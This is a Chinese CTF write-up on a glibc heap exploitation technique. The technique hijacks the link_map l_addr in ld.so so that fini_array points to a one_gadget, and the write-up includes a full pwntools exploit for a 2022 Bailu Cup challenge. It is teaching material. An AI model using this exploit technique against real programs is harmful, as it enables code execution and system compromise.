## 前言

笔者也是刚学完house of cat和house of
apple不久，学完之后，不由得感叹:PWN八股！随着GLIBC的不断更新，国内的很多比赛也都开始使用高版本的GLIBC，但是高版本去除了一些HOOK，使得我们传统劫持
free_hook，malloc_hook等各种hook的方法失效，随之而来的就是一系列的
_IO_FILE利用手法，学起来也比较麻烦，但如果我们能够找到功能类似这些HOOK的替代品，是不是就能像曾经低版本GLIBC那样来轻轻松松实现漏洞利用呢？

本文笔者将通过劫持ld.so中存储的程序基地址，索引fini_array字段到可控地址上，来实现漏洞利用。

## 利用条件

  * 能劫持tcache的next字段

  * 程序可以从main函数返回或者执行exit函数

## 原理分析

关于fini_array数组，这里贴一张网上已经传烂的图片,来进行讲解：

![mhOGx.png](https://image.3001.net/images/20220929/1664438880_633552606d80190eaeb5e.png!small)

图中标出的地方就是fini_array数组，通过流程图，我们很容易的可以看出来。程序在从main函数返回或者执行exit函数的时候会执行fini_array数组内的内容。本文就是通过劫持这个数组，进而劫持程序执行流程拿shell。

了解过house of banana的师傅都知道，在ld.so里有个_rtld_global结构体。

我们通过看源码可以知道 _rtld_global结构体里存在着一些结构体指针

    
    
    struct rtld_global
    {
    #endif
      /* Don't change the order of the following elements.  'dl_loaded'
         must remain the first element.  Forever.  */
    
    /* Non-shared code has no support for multiple namespaces.  */
    #ifdef SHARED
    # define DL_NNS 16
    #else
    # define DL_NNS 1
    #endif
      EXTERN struct link_namespaces
      {
        /* A pointer to the map for the main map.  */
        struct link_map *_ns_loaded;
        /* Number of object in the _dl_loaded list.  */
        unsigned int _ns_nloaded;
        /* Direct pointer to the searchlist of the main object.  */
        struct r_scope_elem *_ns_main_searchlist;
        /* This is zero at program start to signal that the global scope map is
           allocated by rtld.  Later it keeps the size of the map.  It might be
           reset if in _dl_close if the last global object is removed.  */
        unsigned int _ns_global_scope_alloc;
    
        /* During dlopen, this is the number of objects that still need to
           be added to the global scope map.  It has to be taken into
           account when resizing the map, for future map additions after
           recursive dlopen calls from ELF constructors.  */
        unsigned int _ns_global_scope_pending_adds;
    
        /* Once libc.so has been loaded into the namespace, this points to
           its link map.  */
        struct link_map *libc_map;
    
        /* Search table for unique objects.  */
        struct unique_sym_table
        {
          __rtld_lock_define_recursive (, lock)
          struct unique_sym
          {
        uint32_t hashval;
        const char *name;
        const ElfW(Sym) *sym;
        const struct link_map *map;
          } *entries;
          size_t size;
          size_t n_elements;
          void (*free) (void *);
        } _ns_unique_sym_table;
        /* Keep track of changes to each namespace' list.  */
        struct r_debug _ns_debug;
      } _dl_ns[DL_NNS];
      /* One higher than index of last used namespace.  */
      EXTERN size_t _dl_nns;
    };
    

我们重点关注_ns_loaded这个结构体指针：

![mFQRF.png](https://image.3001.net/images/20220929/1664438882_63355262cff6798d2c521.png!small)

跟进这个结构体看一下，发现l_addr字段保存了程序的基地址，对于开启了pie保护的程序来说，都是需要通过基地址+偏移的方式来索引程序的虚拟地址的，所以我们可以通过劫持l_addr字段，来将基地址+fini_array偏移使其索引到我们可控的地址上。

![mFS96.png](https://image.3001.net/images/20220929/1664438883_6335526377afb6043d23a.png!small)

这样我们只需要在可控地址上写入one_gadget即可在程序结束时，劫持程序，来拿到shell。

## 实战应用

### 2022柏鹭杯 复杂的溢出

程序有三个功能，分别是malloc,free和view

op_malloc函数:

这个函数限制的申请堆块的大小，同时能向堆块里写内容

    
    
    int op_malloc()
    {
      unsigned __int64 index; // [rsp+0h] [rbp-10h]
      unsigned __int64 size; // [rsp+8h] [rbp-8h]
    
      puts("Index?");
      index = get_index();
      puts("Size?");
      size = get_number();
      if ( !size || size > 0x200 )
        return puts("Interesting...");
      *((_QWORD *)&chonks + index) = malloc(size);
      printf("Enter content: ");
      return (unsigned int)fgets(*((char **)&chonks + index), size, stdin);
    }
    

op_free函数:

存在uaf漏洞，指针未清空

    
    
    void op_free()
    {
      unsigned __int64 index; // [rsp+8h] [rbp-8h]
    
      puts("Index?");
      index = get_index();
      free(*((void **)&chonks + index));
    }
    

op_view函数：

输出堆块里的内容

    
    
    int op_view()
    {
      unsigned __int64 index; // [rsp+8h] [rbp-8h]
    
      puts("Index?");
      index = get_index();
      return puts(*((const char **)&chonks + index));
    }
    

漏洞比较明显，但是如果利用常见的house of cat,house of
apple等手法，就需要伪造几个符合large_bin大小的堆块，同时还需要伪造一些IO_FILE的结构，也是比较麻烦的，所以我们可以通过泄露libc之后，构造一个堆块重叠然后修改其next字段为
_na_loaded结构体就可以，然后再修改程序基地址为堆地址，将fini_array数组，索引到我们提前写好one_gadget的堆地址处就可以了。

exp

    
    
    from pwn import *
    r = process('./note2')
    e = ELF('./note2')
    libc = e.libc
    context.terminal = ['tmux', 'splitw', '-h']
    context.log_level = 'debug'
    
    se      = lambda data               :r.send(data) 
    sa      = lambda delim,data         :r.sendafter(delim, data)
    sl      = lambda data               :r.sendline(data)
    sla     = lambda delim,data         :r.sendlineafter(delim, data)
    sea     = lambda delim,data         :r.sendafter(delim, data)
    rc      = lambda numb=4096          :r.recv(numb)
    rl      = lambda                    :r.recvline()
    ru      = lambda delims			    :r.recvuntil(delims)
    uu32    = lambda data               :u32(ru(data)[-4:].ljust(4, b'\0'))
    uu64    = lambda data               :u64(ru(data)[-6:].ljust(8, b'\0'))
    info_base = lambda tag, base        :r.info(tag + ': {:#x}'.format(base))
    leak = lambda name,base :log.success('{} = {:#x}'.format(name, base))
    
    def dbg(cmd):
    	gdb.attach(r,cmd)
    	pause()
    
    def menu(num):
    	ru(b'> ')
    	sl(str(num).encode())
    
    def add(index,size,desc):
    	menu(1)
    	ru(b'Index?\n')
    	sl(str(index).encode())
    	ru(b'Size?\n')
    	sl(str(size))
    	ru(b'Enter content: ')
    	sl(desc)
    
    def delete(index):
    	menu(2)
    	ru(b'Index?\n')
    	sl(str(index).encode())	
    
    def show(index):
    	menu(3)
    	ru(b'Index?\n')
    	sl(str(index).encode())
    
    def leave():
    	menu(4)
    
    for i in range(9):
    	add(i,0x88,b'a')
    
    for i in range(8):
    	delete(8-i)
    
    show(1)
    libc_base = uu64(b'\x7f')-0x219ce0
    leak("libc_base",libc_base)
    show(8)
    rc(2)
    heap_base = (u64(rl().strip().ljust(8,b'\x00')) << 12)
    free_hook = libc_base + libc.sym['__free_hook']
    offest = 0x26b2e0
    link_map = libc_base + offest
    shell = libc_base + 0xebcf1
    leak("heap_base",heap_base)
    
    delete(0) #0x120
    
    add(9,0x110,b'a'*0x88 + p64(0x90+0x91) + b'a'*0x10)
    delete(1)
    
    target = (link_map-0x80) ^ (heap_base >> 12)
    
    add(9,0x110,b'a'*0x88 + p64(0x91) + p64(target))
    add(8,0x88,p64(shell))#0x3c0
    add(7,0x88,b'a'*0x80 + p64(heap_base + 0x3c0 - 0x3d78))
    sl(b'4')
    
    r.interactive()
    

## 总结

本文中所提到的利用手法，也许一些师傅已经使用过，但是目前并没有相关的文章。笔者认为这种利用手法相对于之前的一些IO_FILE利用手法，利用起来是比较容易理解和轻松的，而且应该能通杀目前所有版本的GLIBC。

